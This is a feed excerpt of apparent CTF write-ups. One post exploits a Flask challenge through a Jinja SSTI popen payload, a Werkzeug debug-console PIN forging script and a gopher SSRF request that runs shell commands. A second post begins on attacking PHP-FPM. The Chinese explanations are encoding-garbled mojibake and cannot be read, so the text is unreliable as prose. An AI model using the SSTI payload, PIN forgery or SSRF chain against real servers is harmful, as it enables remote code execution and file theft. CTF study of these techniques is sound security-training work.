class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;__c&quot;</span><span class="string">&quot;lass__&quot;</span>][<span class="string">&quot;__b&quot;</span><span class="string">&quot;ases__&quot;</span>][<span class="number">0</span>][<span class="string">&quot;__subcl&quot;</span><span class="string">&quot;asses__&quot;</span>]()[<span class="number">133</span>][<span class="string">&quot;__in&quot;</span><span class="string">&quot;it__&quot;</span>][<span class="string">&quot;__gl&quot;</span><span class="string">&quot;obals__&quot;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;ca&#x27;</span><span class="string">&#x27;t /*&#x27;</span>).<span class="title function_">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•çš„ä¸­æ‹¬å·è·å–å±æ€§,å­—ç¬¦ä¸²æ‹¼æ¥,æ²¡å•¥å¥½è¯´çš„</p><p>è®°å¾—urlç¼–ç åæ”¾åœ¨æŠ¥æ–‡é‡Œé¢.</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049519480-1702087704091-6.png" alt="1702049519480"></p><p>æ¯”è¾ƒç®€å•</p><h1 id="double_ssä¹‹éé¢„æœŸ"><span id="double_ssä¹‹éé¢„æœŸ"> Double_SSä¹‹éé¢„æœŸ</span></h1><p>ç”±äºğŸ‘´ä»£ç æ˜¯ç¼ç¼è¡¥è¡¥å‡ºæ¥çš„,å¿˜è®°å…³debug,äºæ˜¯å°±æ˜¯æœ‰éé¢„æœŸ,è€Œä¸”å’‹å°±é‚£ä¹ˆå·§å‘¢,è¿˜å¯ä»¥é€šè¿‡fileåè®®è¯»æ–‡ä»¶.</p><p>ä½†æ˜¯SSRFåˆ©ç”¨consoleæœ‰ä¸€å®šéš¾åº¦,å„ä½å¸ˆå‚…çœ‹çœ‹å°±å¥½.</p><h2 id="ç®—pinç "><span id="ç®—pinç "> ç®—pinç </span></h2><p>debugæ¨¡å¼å¼€äº†ä¹‹å,è®¿é—®consoleä¼šå‡ºç°ä¸€ä¸ªè¾“å…¥pinç çš„åœ°æ–¹,è¾“å…¥æ­£ç¡®çš„pin,å°±èƒ½è¿›å»æ‰§è¡Œä»»æ„pythonä»£ç ,ä¸è¿‡pinç æ˜¯æœ‰ç®—æ³•é€»è¾‘çš„.</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049670007-1702087704091-7.png" alt="1702049670007"></p><p>å…·ä½“æ¥è¯´è„šæœ¬å¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">        <span class="string">&quot;root&quot;</span>,#/etc/passwd</span><br><span class="line">        <span class="string">&quot;flask.app&quot;</span>,#é»˜è®¤</span><br><span class="line">        <span class="string">&quot;Flask&quot;</span>,#é»˜è®¤</span><br><span class="line">        <span class="string">&#x27;/usr/local/lib/python3.9/dist-packages/flask/app.py&#x27;</span> ,#ä¸€ä¸ªè·¯å¾„ä¿¡æ¯</span><br><span class="line">    ]</span><br><span class="line">addr = <span class="string">&quot;02:42:ac:02:1d:64&quot;</span></span><br><span class="line">boot_id = <span class="string">&quot;fcf66b92-efb4-40db-b14b-952a04033668&quot;</span></span><br><span class="line">cgroup = <span class="string">&quot;4184c5b8cc23b91413e5c41e35a5c66ea81cc007e0cc3ed46d5c55bf2d3e3524&quot;</span></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="title function_">str</span>(<span class="title function_">int</span>(<span class="string">&quot;0x&quot;</span>+addr.<span class="title function_">replace</span>(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="number">16</span>)), #/sys/<span class="keyword">class</span>/net/eth0/address åå…­è¿›åˆ¶è½¬åè¿›åˆ¶</span><br><span class="line">       boot_id+cgroup</span><br><span class="line">]#è¯»å–/proc/sys/kernel/random/boot_idå’Œ/proc/self/cgroupæ‹¼æ¥è€Œæˆ</span><br><span class="line">h = hashlib.<span class="title function_">sha1</span>()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> <span class="title function_">chain</span>(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> not <span class="attr">bit</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span>(bit, str):</span><br><span class="line">        bit = bit.<span class="title function_">encode</span>(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.<span class="title function_">update</span>(bit)</span><br><span class="line">h.<span class="title function_">update</span>(b<span class="string">&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = f<span class="string">&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">If</span> we need to generate a pin we salt it a bit more so that we don<span class="string">&#x27;t</span></span><br><span class="line"><span class="string"># end up with the same value and generate out 9 digits</span></span><br><span class="line"><span class="string">num = None</span></span><br><span class="line"><span class="string">if num is None:</span></span><br><span class="line"><span class="string">    h.update(b&quot;pinsalt&quot;)</span></span><br><span class="line"><span class="string">    num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="string"># we don&#x27;</span>t have a result yet.</span><br><span class="line">rv = <span class="title class_">None</span></span><br><span class="line"><span class="keyword">if</span> rv is <span class="title class_">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.<span class="title function_">join</span>(</span><br><span class="line">                num[<span class="attr">x</span>: x + group_size].<span class="title function_">rjust</span>(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0</span>, <span class="title function_">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(rv)</span><br><span class="line"><span class="title function_">print</span>(cookie_name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¹ˆé•¿ä¹Ÿä¸ç”¨å®³æ€•,å› ä¸ºéƒ½æ˜¯ä»åº“çš„æºç é‡Œé¢ç¿»å‡ºæ¥çš„,æˆ‘ä»¬åªæ˜¯å¯¹ä¼ å…¥çš„å‚æ•°ä¾ç…§é¢˜ç›®ç¯å¢ƒä¿®æ”¹</p><p>åˆ†ä¸ºä¸¤éƒ¨åˆ†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">        <span class="string">&quot;root&quot;</span>,#/etc/passwd</span><br><span class="line">        <span class="string">&quot;flask.app&quot;</span>,#é»˜è®¤</span><br><span class="line">        <span class="string">&quot;Flask&quot;</span>,#é»˜è®¤</span><br><span class="line">        <span class="string">&#x27;/usr/local/lib/python3.9/dist-packages/flask/app.py&#x27;</span> ,#flaskçš„è·¯å¾„,é€šè¿‡æŠ¥é”™å¾—åˆ°</span><br><span class="line">    ]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€éƒ¨åˆ†çš„ä¿¡æ¯æ¥æº</p><p>ç”¨æˆ·ä¿¡æ¯:å½“å‰ç”¨æˆ·,ç”±äºæˆ‘æ˜¯rootæƒé™å¼€å¯,ç›´æ¥å°±æ˜¯root,ä¸­é—´éƒ½æ˜¯é»˜è®¤çš„</p><p>è·¯å¾„ä¿¡æ¯ç›´æ¥æŠ¥é”™å¾—åˆ°</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049838743-1702087704091-8.png" alt="1702049838743"></p><p>ç¬¬äºŒéƒ¨åˆ†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private_bits = [</span><br><span class="line">    <span class="title function_">str</span>(<span class="title function_">int</span>(<span class="string">&quot;0x&quot;</span>+addr.<span class="title function_">replace</span>(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="number">16</span>)), #/sys/<span class="keyword">class</span>/net/eth0/address åå…­è¿›åˆ¶è½¬åè¿›åˆ¶</span><br><span class="line">       boot_id+cgroup</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§è¦æ±‚è¯»æ¯ä¸ªæ–‡ä»¶å°±è¡Œ,</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049893093-1702087704091-9.png" alt="1702049893093"></p><p>boot_id:è¯»å–<code>/proc/sys/kernel/random/boot_id</code>æˆ–<code>/etc/machineid</code> èƒ½è¯»åˆ°å“ªä¸ªå°±ç”¨å“ªä¸ª</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702050335020-1702087704091-10.png" alt="1702050335020"></p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049999452-1702087704091-11.png" alt="1702049999452"></p><p>cgroup:å½“å‰è¿›ç¨‹åˆ†é…,è¯»<code>/proc/self/cgroup</code>,å–ä¸€è¡Œæœ€åä¸€ä¸ª/çš„æœ€åæ‰€æœ‰éƒ¨åˆ†,ä¸æ»¡è¶³ä¸¤ä¸ª<code>/</code>å·å°±æ”¾ç©º</p><p>æ­£å¸¸æ¥è¯´ç›´æ¥å°±ç®—pinç å°±è¡Œäº†,ä½†æ˜¯æœ¬é¢˜ç”±äºæ˜¯é€šè¿‡SSRFå»è§¦å‘çš„,å®é™…ä¸Šæ˜¯ä¸èƒ½ç›´æ¥å’Œconsoleçš„ç®—pinç çš„åœ°æ–¹ç›´æ¥å°±è¡Œäº¤äº’</p><p>è¦é€šè¿‡å‚æ•°è¿›è¡Œrce.</p><h2 id="ä¿®æ”¹æœ¬åœ°ç¯å¢ƒ"><span id="ä¿®æ”¹æœ¬åœ°ç¯å¢ƒ"> ä¿®æ”¹æœ¬åœ°ç¯å¢ƒ</span></h2><p>æœ‰äº›å‚æ•°éœ€è¦æœ¬åœ°ç¯å¢ƒä¿®æ”¹æ­èµ·æ¥åæ‰èƒ½è·å–,äºæ˜¯ä¿®æ”¹æœ¬åœ°çš„ä¸€äº›å‚æ•°.</p><p>è¦ä¿®æ”¹çš„åœ°æ–¹åœ¨<code>site-packages\werkzeug\debug\__init__.py</code></p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702050449222-1702087704091-12.png" alt="1702050449222"></p><p>ç›´æ¥æ”¹å‚æ•°å°±å¥½</p><p>ç”Ÿæˆpinå¦‚ä¸‹:</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702050531867-1702087704091-13.png" alt="1702050531867"></p><p>è¿›å»è¾“å…¥hello world</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702050577664-1702087704091-14.png" alt="1702050577664"></p><p>è§‚å¯Ÿæœ¬åœ°æ—¥å¿—</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/image-20231208235006244-1702087704091-15.png" alt="image-20231208235006244"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯å¦‚ä½•è¿›è¡Œäº¤äº’çš„,éœ€è¦è¾“å…¥ä¸€äº›å‚æ•°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="variable language_">console</span>?&amp;__debugger__=yes&amp;cmd=<span class="title function_">print</span>(<span class="string">&#x27;hello%20world&#x27;</span>)&amp;frm=<span class="number">0</span>&amp;s=3FZpTUaj0dQxTYcLZEgS</span><br></pre></td></tr></table></figure><p>cmdå°±æ˜¯æˆ‘ä»¬çš„pythonæŒ‡ä»¤,frmä¸º0ä¸ç”¨ç®¡.</p><p>sçš„è¯è®¿é—®consoleå°±ä¼šè¿”å›</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702050693994-1702087704091-16.png" alt="1702050693994"></p><p>è®°å¾—é€šè¿‡æºç å»è§‚çœ‹</p><p>æœ€åè¿˜æœ‰ä¸ªcookies,å› ä¸ºç›®å‰è¿˜æ²¡æœ‰ä»»ä½•ä¸œè¥¿èƒ½è¯æ˜æˆ‘ä»¬è¾“å…¥çš„pinç æ˜¯å¯¹çš„,é‚£ä¹ˆèƒ½è¯æ˜pinç çš„å°±æ˜¯cookie</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/image-20231209101236504.png" alt="image-20231209101236504"></p><p>ä½¿ç”¨è¯¥cookieè®¿é—®,è®¿é—®consoleä¸ä¼šè¦æ±‚ä½ è¾“å…¥pinç .</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wzd9b6ccf942a2d4be0994c=<span class="number">1702050544</span>|7042449f328c</span><br></pre></td></tr></table></figure><h2 id="exp"><span id="exp"> exp</span></h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">test3 =\</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;GET /console?__debugger__=yes&amp;cmd=__import__(&#x27;os&#x27;).popen(&#x27;cat%20%2Fflag&#x27;).read()&amp;frm=0&amp;s=9FPI6o2CgAggq3jBjcV9 HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:5555</span></span><br><span class="line"><span class="string">Cookie: session=eyJhZG1pbiI6MX0.ZWbvig.l215-wFOVQ7HHFD-xi2pkMNxaIM;__wzd9b6ccf942a2d4be0994c=1702050544|7042449f328c</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">tmp = urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(test3)</span><br><span class="line"><span class="keyword">new</span> = tmp.<span class="title function_">replace</span>(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:5555/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(<span class="keyword">new</span>)</span><br><span class="line"><span class="title function_">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702050965591-1702087704091-17.png" alt="1702050965591"></p><p>è¿™æ˜¯æœ‰å›æ˜¾çš„,æ›¾ç»å¤ç°è¿‡SCTFæ— å›æ˜¾çš„SSRF,éš¾åº¦çˆ†ç‚¸.</p><h1 id="end"><span id="end"> END</span></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://1llustrious.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>JQCTF-Webshell-ng</title>
    <link href="https://1llustrious.github.io/2023/12/04/JQCTF-Webshell-ng/"/>
    <id>https://1llustrious.github.io/2023/12/04/JQCTF-Webshell-ng/</id>
    <published>2023-12-03T23:55:48.000Z</published>
    <updated>2023-12-10T10:16:27.731Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">å†™åœ¨å‰é¢</a></li><li><a href="#%E5%85%88%E5%AD%A6%E4%B8%80%E6%B3%A2fastcgi">å…ˆå­¦ä¸€æ³¢FastCGI</a><ul><li><a href="#fpm">fpm</a></li><li><a href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">ä»»æ„ä»£ç æ‰§è¡Œ</a></li></ul></li><li><a href="#%E6%BA%90%E7%A0%81%E9%89%B4%E8%B5%8F%E4%B8%80%E6%B3%A2">æºç é‰´èµä¸€æ³¢</a></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">ä¿¡æ¯æœé›†</a><ul><li><a href="#%E6%89%AB%E7%9B%AE%E5%BD%95">æ‰«ç›®å½•</a></li></ul></li><li><a href="#%E8%BF%9E%E6%8E%A5mysql">è¿æ¥mysql</a></li><li><a href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC">è‡ªåŠ¨åŒ–è„šæœ¬</a><ul><li><a href="#%E4%B8%BB%E9%80%BB%E8%BE%91">ä¸»é€»è¾‘</a></li><li><a href="#%E5%8F%82%E6%95%B0%E5%A4%84%E7%90%86">å‚æ•°å¤„ç†</a></li><li><a href="#yield">yield</a></li></ul></li><li><a href="#%E9%A6%96%E5%85%88%E6%9D%A5%E7%9C%8B%E7%9C%8B%E9%9D%9E%E5%B8%B8%E6%8A%BD%E8%B1%A1%E7%9A%84%E4%B8%80%E9%81%93%E6%87%92%E7%8C%AB%E6%9D%AF">é¦–å…ˆæ¥çœ‹çœ‹éå¸¸æŠ½è±¡çš„ä¸€é“æ‡’çŒ«æ¯</a><ul><li><a href="#%E6%BA%90%E7%A0%81%E9%89%B4%E8%B5%8F%E4%B8%80%E6%B3%A2-1">æºç é‰´èµä¸€æ³¢</a></li><li><a href="#%E7%BB%95%E8%BF%87openbase_dir">ç»•è¿‡openbase_dir</a></li><li><a href="#%E9%A6%96%E5%85%88%E5%87%86%E5%A4%87%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%9A%84so">é¦–å…ˆå‡†å¤‡ä¸€ä¸ªæ¶æ„çš„so</a></li><li><a href="#%E7%94%9F%E6%88%90fpm%E6%81%B6%E6%84%8F%E6%95%B0%E6%8D%AE">ç”Ÿæˆfpmæ¶æ„æ•°æ®</a></li><li><a href="#ftp%E5%88%A9%E7%94%A8">ftpåˆ©ç”¨</a></li><li><a href="#%E6%9C%80%E7%BB%88exp">æœ€ç»ˆexp</a></li></ul></li><li><a href="#%E9%A2%98%E7%9B%AE%E7%9A%84fpm%E6%80%8E%E4%B9%88%E6%89%93">é¢˜ç›®çš„fpmæ€ä¹ˆæ‰“</a><ul><li><a href="#arrayobject%E7%9A%84%E5%A6%99%E7%94%A8">ArrayObjectçš„å¦™ç”¨</a></li><li><a href="#fpm%E7%94%9F%E6%88%90">fpmç”Ÿæˆ</a></li></ul></li><li><a href="#%E5%AE%8C%E6%95%B4exp">å®Œæ•´exp</a></li></ul><!-- tocstop --><h1 id="å†™åœ¨å‰é¢"><span id="å†™åœ¨å‰é¢"> å†™åœ¨å‰é¢</span></h1><p>md,JQCTFåˆè¢«å«èµ·æ¥æ‰“æ¯”èµ›äº†,ç„¶è€ŒğŸ‘´tmç¿”éƒ½è¢«æ‰“å‡ºæ¥äº†.å…¶ä¸­æœ‰ä¸€é“é¢˜æ¯”è¾ƒæœ‰æ„æ€,è€Œä¸”ğŸ‘´å’Œâ›°ğŸ“¦giegieå½“æ—¶ä¹Ÿæ˜¯åšåˆ°äº†ä¸€åŠ,å‡ºäº†ä¸€åŠçš„flag,äºæ˜¯ä¾¿æƒ³ç€å¤ç°ä¸€æ³¢è¿™ä¸ªé¢˜,â›°ğŸ“¦giegieæ˜¯çœŸå¼º,è¦åˆ°äº†docker.</p><p><a href="https://boogipop.com/2023/05/16/FTP%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F_PHP-FPM%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">FTPè¢«åŠ¨æ¨¡å¼/PHP-FPMæ”»å‡»åˆ©ç”¨æ€»ç»“ - Boogiepop Doesnâ€™t Laugh (boogipop.com)</a></p><p><a href="https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/">AmiaaaZâ€™s Site | æ”»å‡» PHP-FPM å­¦ä¹ ç¬”è®°</a></p><p>æ„Ÿè°¢å¤§Bè€å¸ˆå’Œè‘µå­å§å§çš„â¤.</p><p><a href="https://woshilnp.github.io/2021/06/15/%E8%93%9D%E5%B8%BD%E6%9D%AF2021-One-Pointer-PHP/">https://woshilnp.github.io/2021/06/15/è“å¸½æ¯2021-One-Pointer-PHP/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>Pç¥è®²å¾—å¾ˆæ¸…æ™°</p><p><a href="https://github.com/Nu1LCTF/jqctf2023/tree/main/web/webshell-ng">https://github.com/Nu1LCTF/jqctf2023/tree/main/web/webshell-ng</a></p><p>å‡ºé¢˜äººç»™çš„exp,å¼€å±€ä¸€ç¯‡exp,å†…å®¹å…¨é æ°´(bushi).</p><h1 id="å…ˆå­¦ä¸€æ³¢fastcgi"><span id="å…ˆå­¦ä¸€æ³¢fastcgi"> å…ˆå­¦ä¸€æ³¢FastCGI</span></h1><p>nmdğŸ‘´åªåšå‡ºmysqli,è¿˜æœ‰å¦ä¸€åŠçš„flagéœ€è¦SSRFæ‰“fpm,ğŸ‘´ä¸€å¼€å§‹æ²¡çœ‹åˆ°curl,æ²¡å¾€SSRFé‚£ä¸ªæ–¹å‘æƒ³.</p><p>è¿™ç§è¢«å¤§ä½¬ä»¬æ‰“çƒ‚äº†çš„ä¸œè¥¿,æˆ‘åˆ°ç°åœ¨æ‰é—»ä¸ªå°¾æ°”,ä½†æ˜¯ä½œä¸ºwebdog,å´åˆä¸å¾—ä¸å“é‰´.</p><p><code>FastCGI</code>è¯´äººè¯å°±æ˜¯ä¸€ç§é€šä¿¡åè®®,è·Ÿhttpæœ‰ç‚¹ç±»ä¼¼,å¤´éƒ¨ç»“æ„å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  /* Header */</span><br><span class="line">  unsigned char version; // ç‰ˆæœ¬</span><br><span class="line">  unsigned char <span class="built_in">type</span>; // æœ¬æ¬¡recordçš„ç±»å‹</span><br><span class="line">  unsigned char requestIdB1; // æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚<span class="built_in">id</span></span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; // bodyä½“çš„å¤§å°</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; // é¢å¤–å—å¤§å°</span><br><span class="line">  unsigned char reserved; </span><br><span class="line"></span><br><span class="line">  /* Body */</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure><p>è¢«å¤§ä½¬ä»¬ç”¨çƒ‚äº†,æˆ‘å¼•ç”¨ä¸€ä¸‹.æ‹¿åˆ°<code>contentLength</code>ï¼Œç„¶åå†åœ¨TCPæµé‡Œè¯»å–å¤§å°ç­‰äº<code>contentLength</code>çš„æ•°æ®ï¼Œè¿™å°±æ˜¯bodyä½“ã€‚</p><h2 id="fpm"><span id="fpm"> fpm</span></h2><p><code>fpm</code>å°±æ˜¯phpä¸­ä¸€ä¸ªè§£æ<code>FastCGI</code>çš„è§£æå™¨.Nginxæ¥æ”¶åˆ°çš„<code>FastCGI</code>ä¼šä¼ ç»™<code>fpm</code></p><p>fpmä¼šæŒ‰ç…§fastcgiåè®®è§£ææˆæ•°æ®</p><p>ä¸¾ä¸ªğŸŒ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: <span class="string">&#x27;/var/www/html/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: <span class="string">&#x27;/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;?a=1&amp;b=2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>: <span class="string">&#x27;/index.php?a=1&amp;b=2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: <span class="string">&#x27;/var/www/html&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢æœ‰ç›¸å½“å¤šçš„é”®å€¼å¯¹,å…¶å®è¢«fpmè§£æå,éƒ½ä¼šåŠ åˆ°phpçš„è¶…å…¨å±€å˜é‡<code>$_SERVER</code>æ•°ç»„ä¸­,PHP-FPMæ‹¿åˆ°fastcgiçš„æ•°æ®åŒ…åï¼Œè¿›è¡Œè§£æï¼Œå¾—åˆ°ä¸Šè¿°è¿™äº›ç¯å¢ƒå˜é‡ã€‚ç„¶åï¼Œæ‰§è¡Œ<code>SCRIPT_FILENAME</code>çš„å€¼æŒ‡å‘çš„PHPæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯<code>/var/www/html/index.php</code></p><h2 id="ä»»æ„ä»£ç 